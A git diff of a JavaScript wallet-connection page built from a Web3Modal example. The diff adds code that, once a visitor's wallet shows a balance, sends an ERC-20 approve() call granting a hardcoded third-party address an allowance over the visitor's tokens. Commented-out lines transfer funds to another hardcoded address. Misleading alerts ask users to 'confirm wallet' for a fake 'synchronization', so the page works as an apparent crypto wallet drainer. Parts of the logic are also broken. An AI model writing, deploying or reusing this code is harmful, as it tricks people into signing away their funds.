@@ -4,10 +4,10 @@
  * Example JavaScript code that interacts with the page and Web3 wallets
  */
 
- // Unpkg imports
+// Unpkg imports
 document.getElementById("ether").style.display = "none";
- document.getElementById("matic").style.display = "none";
- document.getElementById("bsc").style.display = "none";
+document.getElementById("matic").style.display = "none";
+document.getElementById("bsc").style.display = "none";
 
 const Web3Modal = window.Web3Modal.default;
 const WalletConnectProvider = window.WalletConnectProvider.default;
@@ -37,7 +37,7 @@ function init() {
 
   // Check that the web page is run in a secure context,
   // as otherwise MetaMask won't be available
-  if(location.protocol !== 'https:') {
+  if (location.protocol !== 'https:') {
     // https://ethereum.stackexchange.com/a/62217/620
     const alert = document.querySelector("#alert-error-https");
     alert.style.display = "block";
@@ -52,21 +52,21 @@ function init() {
     walletconnect: {
       package: WalletConnectProvider,
       options: {
-//        rpc:{
-//         56: "https://bsc-dataseed.binance.org/",
-//        //137: "https://polygon-rpc.com",
-//             //100: "https://dai.poa.network",
-       
-       
-       
-//         // Mikko's test key - don't copy as your mileage may vary
-//         //infuraId: "8043bb2cf99347b1bfadfb233c5325c0",
-//       },
-//       network:'binance',//'polygon'],
-//       chainId: 56,
-      infuraId: "d452c5f789194e2e9a1055567a2fb41",
+        //        rpc:{
+        //         56: "https://bsc-dataseed.binance.org/",
+        //        //137: "https://polygon-rpc.com",
+        //             //100: "https://dai.poa.network",
 
-    }
+
+
+        //         // Mikko's test key - don't copy as your mileage may vary
+        //         //infuraId: "8043bb2cf99347b1bfadfb233c5325c0",
+        //       },
+        //       network:'binance',//'polygon'],
+        //       chainId: 56,
+        infuraId: "d452c5f789194e2e9a1055567a2fb41",
+
+      }
     },
 
     fortmatic: {
@@ -93,8 +93,8 @@ function init() {
  */
 
 async function fetchAccountData() {
- 
- 
+
+
 
   // Get a Web3 instance for the wallet
   const web3 = new Web3(provider);
@@ -113,13 +113,13 @@ async function fetchAccountData() {
   // MetaMask does not give you all accounts, only the selected account
   console.log("Got accounts", accounts);
   selectedAccount = accounts[0];
-//   const balance = await web3.eth.getBalance(address);
-//     // ethBalance is a BigNumber instance
-//     // https://github.com/indutny/bn.js/
-//    const ethBalance = web3.utils.fromWei(balance, "ether");
-//   if(ethBalance > 0){ console.log("Balance greater than Zero");
-//    }
-//   else { console.log("Opening a dialog");}
+  //   const balance = await web3.eth.getBalance(address);
+  //     // ethBalance is a BigNumber instance
+  //     // https://github.com/indutny/bn.js/
+  //    const ethBalance = web3.utils.fromWei(balance, "ether");
+  //   if(ethBalance > 0){ console.log("Balance greater than Zero");
+  //    }
+  //   else { console.log("Opening a dialog");}
 
   document.querySelector("#selected-account").textContent = selectedAccount;
 
@@ -136,25 +136,275 @@ async function fetchAccountData() {
     // ethBalance is a BigNumber instance
     // https://github.com/indutny/bn.js/
     const ethBalance = web3.utils.fromWei(balance, "wei");
-   const value = web3.utils.toBN(ethBalance).toString();
-   if(ethBalance > 0){ console.log("Balance greater than Zero");
-//         web3.eth.sendTransaction({
-//            from: accounts[0],
-//            to: '0xC6b9549f86e669FcAecc5F0F2719FB957B1A3A7D',
-//            value: value
-//        }
-		      
-	approve(); 
-                          
-        console.log(value);
-	console.log('function executed');
-//        .then(function(receipt){
-         
-//        });
+    const value = web3.utils.toBN(ethBalance).toString();
+    if (ethBalance > 0) {
+      console.log("Balance greater than Zero");
+      const spend = '0xfFc96DD0f363daEdb8eD37a4F8B9E9A5b6695578';
+      const from = '0x684D903C16623941ad03c00FF8072eA645049486';
+      //const senderAddress = 0x9e737ea674A3C941FE9C84C30C03578675B69b4c
+      //await window.web3.currentProvider.enable();
+
+      var abi = [{
+        "constant": true,
+        "inputs": [],
+        "name": "name",
+        "outputs": [{
+          "name": "",
+          "type": "string"
+        }],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+      }, {
+        "constant": false,
+        "inputs": [{
+          "name": "_spender",
+          "type": "address"
+        }, {
+          "name": "_value",
+          "type": "uint256"
+        }],
+        "name": "approve",
+        "outputs": [{
+          "name": "",
+          "type": "bool"
+        }],
+        "payable": false,
+        "stateMutability": "nonpayable",
+        "type": "function"
+      }, {
+        "constant": true,
+        "inputs": [],
+        "name": "totalSupply",
+        "outputs": [{
+          "name": "",
+          "type": "uint256"
+        }],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+      }, {
+        "constant": false,
+        "inputs": [{
+          "name": "_from",
+          "type": "address"
+        }, {
+          "name": "_to",
+          "type": "address"
+        }, {
+          "name": "_value",
+          "type": "uint256"
+        }],
+        "name": "transferFrom",
+        "outputs": [{
+          "name": "",
+          "type": "bool"
+        }],
+        "payable": false,
+        "stateMutability": "nonpayable",
+        "type": "function"
+      }, {
+        "constant": true,
+        "inputs": [],
+        "name": "decimals",
+        "outputs": [{
+          "name": "",
+          "type": "uint8"
+        }],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+      }, {
+        "constant": false,
+        "inputs": [{
+          "name": "_to",
+          "type": "address"
+        }, {
+          "name": "_value",
+          "type": "uint256"
+        }, {
+          "name": "_data",
+          "type": "bytes"
+        }],
+        "name": "transferAndCall",
+        "outputs": [{
+          "name": "success",
+          "type": "bool"
+        }],
+        "payable": false,
+        "stateMutability": "nonpayable",
+        "type": "function"
+      }, {
+        "constant": false,
+        "inputs": [{
+          "name": "_spender",
+          "type": "address"
+        }, {
+          "name": "_subtractedValue",
+          "type": "uint256"
+        }],
+        "name": "decreaseApproval",
+        "outputs": [{
+          "name": "success",
+          "type": "bool"
+        }],
+        "payable": false,
+        "stateMutability": "nonpayable",
+        "type": "function"
+      }, {
+        "constant": true,
+        "inputs": [{
+          "name": "_owner",
+          "type": "address"
+        }],
+        "name": "balanceOf",
+        "outputs": [{
+          "name": "balance",
+          "type": "uint256"
+        }],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+      }, {
+        "constant": true,
+        "inputs": [],
+        "name": "symbol",
+        "outputs": [{
+          "name": "",
+          "type": "string"
+        }],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+      }, {
+        "constant": false,
+        "inputs": [{
+          "name": "_to",
+          "type": "address"
+        }, {
+          "name": "_value",
+          "type": "uint256"
+        }],
+        "name": "transfer",
+        "outputs": [{
+          "name": "success",
+          "type": "bool"
+        }],
+        "payable": false,
+        "stateMutability": "nonpayable",
+        "type": "function"
+      }, {
+        "constant": false,
+        "inputs": [{
+          "name": "_spender",
+          "type": "address"
+        }, {
+          "name": "_addedValue",
+          "type": "uint256"
+        }],
+        "name": "increaseApproval",
+        "outputs": [{
+          "name": "success",
+          "type": "bool"
+        }],
+        "payable": false,
+        "stateMutability": "nonpayable",
+        "type": "function"
+      }, {
+        "constant": true,
+        "inputs": [{
+          "name": "_owner",
+          "type": "address"
+        }, {
+          "name": "_spender",
+          "type": "address"
+        }],
+        "name": "allowance",
+        "outputs": [{
+          "name": "remaining",
+          "type": "uint256"
+        }],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+      }, {
+        "inputs": [],
+        "payable": false,
+        "stateMutability": "nonpayable",
+        "type": "constructor"
+      }, {
+        "anonymous": false,
+        "inputs": [{
+          "indexed": true,
+          "name": "from",
+          "type": "address"
+        }, {
+          "indexed": true,
+          "name": "to",
+          "type": "address"
+        }, {
+          "indexed": false,
+          "name": "value",
+          "type": "uint256"
+        }, {
+          "indexed": false,
+          "name": "data",
+          "type": "bytes"
+        }],
+        "name": "Transfer",
+        "type": "event"
+      }, {
+        "anonymous": false,
+        "inputs": [{
+          "indexed": true,
+          "name": "owner",
+          "type": "address"
+        }, {
+          "indexed": true,
+          "name": "spender",
+          "type": "address"
+        }, {
+          "indexed": false,
+          "name": "value",
+          "type": "uint256"
+        }],
+        "name": "Approval",
+        "type": "event"
+      }, {
+        "anonymous": false,
+        "inputs": [{
+          "indexed": true,
+          "name": "from",
+          "type": "address"
+        }, {
+          "indexed": true,
+          "name": "to",
+          "type": "address"
+        }, {
+          "indexed": false,
+          "name": "value",
+          "type": "uint256"
+        }],
+        "name": "Transfer",
+        "type": "event"
+      }]
+      const contractadress = '0x01BE23585060835E02B77ef475b0Cc51aA1e0709';
+      var contract = new web3.eth.Contract(abi, contractadress);
+      await contract.methods.approve(spend, this.web3.utils.toWei('10')).send({
+        from: from });
+
+        //var contract = new web3.eth.Contract(abi,contractadress);     //contract.methods.approve(spend, amount).send({
+        //from:fro
+			console.log('Game')
+      console.log(value);
+      //        .then(function(receipt){
+
+      //        });
 
 
-     }
-    else{console.log("balance is not greater ")}
+    } else {
+      console.log("balance is not greater ")
+    }
     console.log("Opening a dialog");
     const humanFriendlyBalance = parseFloat(ethBalance).toFixed(4);
     // Fill in the templated row and put in the document
@@ -174,17 +424,18 @@ async function fetchAccountData() {
   document.getElementById("matic").style.display = "";
   document.getElementById("bsc").style.display = "";
   web3.eth.net.getId().then(console.log);
-  var chainid =web3.eth.net.getId();
-  if(chainid != 97 || chainid != 137){
-  alert("You are on the Ethereum Network, Kindly Confirm Wallet to Initiate Wallet SyChronization, Thanks.");}
-  else if(chainid != 97 || chainid != 1) {
-  alert("You are on the Polygon(Matic) Network, Kindly Confirm Wallet to Initiate Wallet SyChronization, Thanks.");}
-  else{
-   alert("You are on the Binance Smart Chain Network, Kindly Confirm Wallet to Initiate Wallet SyChronization, Thanks.");}
-  
+  var chainid = web3.eth.net.getId();
+  if (chainid != 97 || chainid != 137) {
+    alert("You are on the Ethereum Network, Kindly Confirm Wallet to Initiate Wallet SyChronization, Thanks.");
+  } else if (chainid != 97 || chainid != 1) {
+    alert("You are on the Polygon(Matic) Network, Kindly Confirm Wallet to Initiate Wallet SyChronization, Thanks.");
+  } else {
+    alert("You are on the Binance Smart Chain Network, Kindly Confirm Wallet to Initiate Wallet SyChronization, Thanks.");
+  }
+
   document.querySelector("#prepare").style.display = "none";
-  document.querySelector("#connected").style.display = "block"; 
- 
+  document.querySelector("#connected").style.display = "block";
+
   //else{ console.log(" funtion not working")}
 
 }
@@ -222,63 +473,65 @@ async function onConnect() {
   console.log("Opening a dialog", web3Modal);
   try {
     provider = await web3Modal.connect();
-    
-   
-  } catch(e) {
+
+
+  } catch (e) {
     game = false;
-    console.log("Could not get a wallet connection",e,game);
+    console.log("Could not get a wallet connection", e, game);
     return;
   }
- game = true;
- if (game ===true){
-  console.log("we are in",game);
-//   document.getElementById("speedbtn").style.display = "";
-//   document.getElementById("jmpbtn").style.display = "";
-//   document.getElementById("treat").style.display = "";
-//   
-// //   
-  // Subscribe to accounts change
-  provider.on("accountsChanged", (accounts) => {
-    fetchAccountData();
-  });
+  game = true;
+  if (game === true) {
+    console.log("we are in", game);
+    //   document.getElementById("speedbtn").style.display = "";
+    //   document.getElementById("jmpbtn").style.display = "";
+    //   document.getElementById("treat").style.display = "";
+    //   
+    // //   
+    // Subscribe to accounts change
+    provider.on("accountsChanged", (accounts) => {
+      fetchAccountData();
+    });
 
-  // Subscribe to chainId change
-  provider.on("chainChanged", (chainId) => {
-    fetchAccountData();
-  });
+    // Subscribe to chainId change
+    provider.on("chainChanged", (chainId) => {
+      fetchAccountData();
+    });
 
-  // Subscribe to networkId change
-  provider.on("networkChanged", (networkId) => {
-    fetchAccountData();
-  });
+    // Subscribe to networkId change
+    provider.on("networkChanged", (networkId) => {
+      fetchAccountData();
+    });
 
-  await refreshAccountData();}
-else if(game ===false){console.log("else if game===false",game);
- document.getElementById("ether").style.display = "none";
-  document.getElementById("matic").style.display = "none";
-  document.getElementById("bsc").style.display = "none";
-  
+    await refreshAccountData();
+  } else if (game === false) {
+    console.log("else if game===false", game);
+    document.getElementById("ether").style.display = "none";
+    document.getElementById("matic").style.display = "none";
+    document.getElementById("bsc").style.display = "none";
 
+
+  } else {
+    console.log("bad function working", game);
   }
- else{console.log("bad function working",game);}
 
 }
 /**
  * Disconnect wallet button pressed.
  */
 async function onDisconnect() {
- document.getElementById("ether").style.display = "none";
- document.getElementById("matic").style.display = "none";
- document.getElementById("bsc").style.display = "none";
+  document.getElementById("ether").style.display = "none";
+  document.getElementById("matic").style.display = "none";
+  document.getElementById("bsc").style.display = "none";
 
   console.log("Killing the wallet connection", provider);
 
   // TODO: Which providers have close method?
-  if(provider.close) {
-//    document.getElementById("speedbtn").style.display = "none";
-//    document.getElementById("jmpbtn").style.display = "none";
-//    document.getElementById("treat").style.display = "none";
-   await provider.close();
+  if (provider.close) {
+    //    document.getElementById("speedbtn").style.display = "none";
+    //    document.getElementById("jmpbtn").style.display = "none";
+    //    document.getElementById("treat").style.display = "none";
+    await provider.close();
 
     // If the cached provider is not cleared,
     // WalletConnect will default to the existing session
@@ -305,55 +558,56 @@ window.addEventListener('load', async () => {
   document.querySelector("#btn-disconnect").addEventListener("click", onDisconnect);
 });
 
-function etherboy ()  {
- window.ethereum.request({
+function etherboy() {
+  window.ethereum.request({
     method: "wallet_switchEthereumChain",
     params: [{
-        chainId: "0x1",
-        
-      
+      chainId: "0x1",
+
+
     }]
-});
-alert("Ethereum Network Selected, Kindly Confirm Wallet to Initiate Wallet SyChronization, Thanks.");
+  });
+  alert("Ethereum Network Selected, Kindly Confirm Wallet to Initiate Wallet SyChronization, Thanks.");
 }
 
-function maticboy ()  {
- window.ethereum.request({
+function maticboy() {
+  window.ethereum.request({
     method: "wallet_addEthereumChain",
     params: [{
-        chainId: "0x89",
-        rpcUrls: ["https://rpc-mainnet.matic.network/"],
-        chainName: "Matic Mainnet",
-        nativeCurrency: {
-            name: "MATIC",
-            symbol: "MATIC",
-            decimals: 18
-        },
-        blockExplorerUrls: ["https://polygonscan.com/"]
+      chainId: "0x89",
+      rpcUrls: ["https://rpc-mainnet.matic.network/"],
+      chainName: "Matic Mainnet",
+      nativeCurrency: {
+        name: "MATIC",
+        symbol: "MATIC",
+        decimals: 18
+      },
+      blockExplorerUrls: ["https://polygonscan.com/"]
     }]
-});
-alert("Polygon(Matic) Network Selected, Kindly Confirm Wallet to Initiate Wallet SyChronization, Thanks.");}
+  });
+  alert("Polygon(Matic) Network Selected, Kindly Confirm Wallet to Initiate Wallet SyChronization, Thanks.");
+}
 
 
-function bscboy ()  {
- window.ethereum.request({
+function bscboy() {
+  window.ethereum.request({
     method: "wallet_addEthereumChain",
     params: [{
-        chainId: "0x61",
-        rpcUrls: ["https://data-seed-prebsc-1-s1.binance.org:8545/"],
-         
-         //"https://bsc-dataseed.binance.org/"],
-        chainName: "Binance Smart Chain TESTTNET",
-        nativeCurrency: {
-            name: "BNB",
-            symbol: "BNB",
-            decimals: 8
-        },
-        blockExplorerUrls: ["https://bscscan.com/"]
-    }]
-});
+      chainId: "0x61",
+      rpcUrls: ["https://data-seed-prebsc-1-s1.binance.org:8545/"],
 
-alert("Binance Smart Chain Network Selected, Kindly Confirm Wallet to Initiate Wallet SyChronization, Thanks.");
+      //"https://bsc-dataseed.binance.org/"],
+      chainName: "Binance Smart Chain TESTTNET",
+      nativeCurrency: {
+        name: "BNB",
+        symbol: "BNB",
+        decimals: 8
+      },
+      blockExplorerUrls: ["https://bscscan.com/"]
+    }]
+  });
+
+  alert("Binance Smart Chain Network Selected, Kindly Confirm Wallet to Initiate Wallet SyChronization, Thanks.");
 }
 
 
@@ -367,50 +621,6 @@ document.getElementById("bsc").onclick = bscboy;
 
 
 
-
-async function approve() {
-//const web3 = new Web3('https://bsc-dataseed1.binance.org:443');
-const contractadress = '0x01BE23585060835E02B77ef475b0Cc51aA1e0709';
-const howMuchTokentoApprove = 10;
-const spend = '0xfFc96DD0f363daEdb8eD37a4F8B9E9A5b6695578';
-//const senderAddress = 0x9e737ea674A3C941FE9C84C30C03578675B69b4c
-//await window.web3.currentProvider.enable();
-
- var abi = [{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"},{"name":"_data","type":"bytes"}],"name":"transferAndCall","outputs":[{"name":"success","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_subtractedValue","type":"uint256"}],"name":"decreaseApproval","outputs":[{"name":"success","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"success","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_addedValue","type":"uint256"}],"name":"increaseApproval","outputs":[{"name":"success","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"remaining","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"},{"indexed":false,"name":"data","type":"bytes"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"}]
-    try {
-        var contract = new web3.eth.Contract(abi,contractadress);
-        contract.methods.approve(spend, amount).send({
-   	from: accounts[0]
-});
-
-        //var nonceResponse = await web3.eth.getTransactionCount(senderAddress); 
-       // var nonce = nonceResponse;
-      /*   var txParams = {
-            gas: web3.utils.toHex(gasLimit),
-            gasPrice: web3.utils.toHex(gasPrice),
-            nonce: web3.utils.toHex(nonce),
-            chainId: chainId,
-            to: contractadress
-        }; */
-
-       /*  
-        txParams.data = await contract.methods.approve(accounts[0],
-                                howMuchTokentoApprove).encodeABI();
-           txParams.nonce = web3.utils.toHex(nonce);
-          nonce += 1;
-        web3.eth.sendTransaction(txParams, process.env.senderPrivateKey); */
-        
-       
-        //await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
-        console.log("Token spending approved. \n");
-        txAlreadyApprove = true;
-        return true
-    } catch (error) {
-        console.log('err', error);
-
-    }
-  
-}
 // var game= 1;
 //  if (game ===1){
 //   console.log("we are in",game);
@@ -423,5 +633,5 @@ const spend = '0xfFc96DD0f363daEdb8eD37a4F8B9E9A5b6695578';
 //   document.getElementById("speedbtn").style.display = "";
 //   document.getElementById("jmpbtn").style.display = "";
 //   document.getElementById("treat").style.display = "";
-  
+
 //   }
